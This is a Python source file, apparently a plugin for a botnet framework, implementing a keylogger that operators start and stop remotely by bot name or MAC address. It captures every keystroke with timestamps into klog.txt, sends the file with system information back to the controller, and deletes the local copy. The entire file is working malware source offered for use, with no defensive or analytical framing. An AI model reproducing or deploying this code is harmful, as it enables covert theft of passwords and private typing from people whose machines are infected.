import threading
import logging
import datetime
import os
from pynput import keyboard

from .. import BotNet, Context, UserException
from ..utils import simple_serializer


_logger = logging.getLogger(f"--> {__name__}  ")


@BotNet.default_script(script_version="0.0.1")
def keylogger(context: Context) -> str:
    """
    Start/stop keylogger.

    syntax:
        `/keylogger {start,stop}`
        or
        `[mac-address] /keylogger {start,stop}`
        or
        `[BOT-NAME] /keylogger {start,stop}`

    example command:
        `/keylogger start`
        `/keylogger stop`
    """

    keylogger_thread_name = "keylog"  # for threading , this way we can prevent multiple keyloggers running at the same time

    command, err = simple_serializer(context.command, [str])
    if err:
        raise UserException(err)

    # if user requested keylogger to be turned on
    if command[0] == "start":

        if keylogger_thread_name in (i.name for i in threading.enumerate()):
            _logger.debug("keylogger is already on")
            return "keylogger is already on"

        keylogger_util = KeyLogger()
        context.set_global_value("keylogger__keylogger_util", keylogger_util)

        _logger.debug("turning keylogger on...")
        keylogger_thread = threading.Thread(
            target=keylogger_util.start, name=keylogger_thread_name
        )
        context.set_global_value("keylogger__keylogger_thread", keylogger_thread)

        keylogger_thread.start()
        keylogger_thread.join()
        _logger.debug("keylogger turned on.")

        return "Key logger turned on."

    # if user requested keylogger to be turned off
    if command[0] == "stop":
        try:
            context.get_global_value("keylogger__keylogger_thread").join()
            context.get_global_value("keylogger__keylogger_util").stop()

            data = context.engine.send_file("klog.txt", context.system_info())
            if not data:
                return "send keylogger file failed; keylogger off"
            else:
                _logger.debug("deleting klog.txt file")

                try:
                    os.remove("klog.txt")
                except Exception as e:
                    return f"remove klog.txt file failed, {e}; keylogger off"

                return "keylogger off"

        except:
            return "keylogger is already off"

    else:
        return f"keylogger Invalid operation {command[0]}"


class KeyLogger:
    """this class is for keylogger utility , you should only start this class from a threading object.
    this way , the keylogger and the app itself will both run at the same time."""

    def __init__(self) -> None:
        self.filename = "klog.txt"

    def pressed_key(self, key):
        """if a key is presses , this function will be called and it will write data."""
        with open(self.filename, "a", errors="ignore") as logs:
            logs.write(f"{str(datetime.datetime.now())} {str(key)}\n")

    def start(self):
        """starting point of keylogger."""
        global _keyboard_listener
        _keyboard_listener = keyboard.Listener(
            on_press=self.pressed_key,
        )
        _keyboard_listener.start()

    def stop(self):
        """stops listener"""
        global _keyboard_listener
        _keyboard_listener.stop()
